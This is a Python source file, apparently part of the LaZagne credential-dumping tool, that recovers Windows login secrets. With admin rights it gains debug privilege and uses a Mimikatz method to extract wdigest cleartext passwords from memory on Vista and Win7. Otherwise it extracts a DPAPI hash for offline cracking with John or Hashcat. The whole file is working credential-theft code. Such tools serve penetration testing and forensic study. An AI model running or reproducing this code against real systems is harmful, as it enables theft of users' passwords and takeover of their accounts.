# -*- coding: utf-8 -*-
import _winreg
import ctypes

from lazagne.config.change_privileges import get_debug_privilege
from lazagne.config.module_info import ModuleInfo
from lazagne.config.winstructure import OpenKey, HKEY_LOCAL_MACHINE, get_os_version, isx64machine
from lazagne.config.constant import constant
from .mimikatz import Mimikatz


class WindowsPassword(ModuleInfo):
    def __init__(self):
        ModuleInfo.__init__(self, 'windows', 'windows', exec_at_end=True)

    def is_in_domain(self):
        """
        Return the context of the host
        If a domain controller is set we are in an active directory.
        """
        try:
            key = OpenKey(HKEY_LOCAL_MACHINE, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\')
            val, _ = _winreg.QueryValueEx(key, 'DCName')
            _winreg.CloseKey(key)
            return val
        except Exception:
            return False

    def run(self):
        """
        - Try to decrypt wdigest password using mimikatz method (only work on Win7 and Vista)
        - Try to check if an already passwords is also used as windows password
        - Windows password not found, return the DPAPI hash (not admin priv needed) to bruteforce using John or Hashcat
        """
        pwd_found = []

        # Check if Admin
        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
            # https://msdn.microsoft.com/en-us/library/windows/desktop/ms724832(v=vs.85).aspx
            supported_os = {
                '6.0': 'Vista',
                '6.1': 'Win7',
            }
            os_version = get_os_version()
            if os_version in supported_os:
                os = supported_os[os_version]
                arch = 'x86'
                if isx64machine():
                    arch = 'x64'

                if get_debug_privilege():
                    # Ready to found passwords
                    self.info('Using mimikatz method')

                    m = Mimikatz(os=os, arch=arch)
                    pwd_found = m.find_wdigest_password()

        if not pwd_found:
            if constant.dpapi:
                # Check if a password already found is a windows password
                password = constant.dpapi.get_cleartext_password()
                if password:
                    pwd_found.append({
                        'Login': constant.username,
                        'Password': password
                    })
                else:
                    # Retrieve dpapi hash used to bruteforce (hash can be retrieved without needed admin privilege)
                    # Method taken from Jean-Christophe Delaunay - @Fist0urs
                    # https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf

                    self.info(u'Windows passwords not found.\nTry to bruteforce this hash (using john or hashcat) '
                              u'depending on your context (domain environment or not)')
                    if constant.dpapi:
                        context = 'local'
                        if self.is_in_domain():
                            context = 'domain'

                        h = constant.dpapi.get_dpapi_hash(context=context)
                        if h:
                            pwd_found.append({
                                'Dpapi_hash_{context}'.format(context=context): constant.dpapi.get_dpapi_hash(
                                                                                                        context=context)
                            })

        return pwd_found
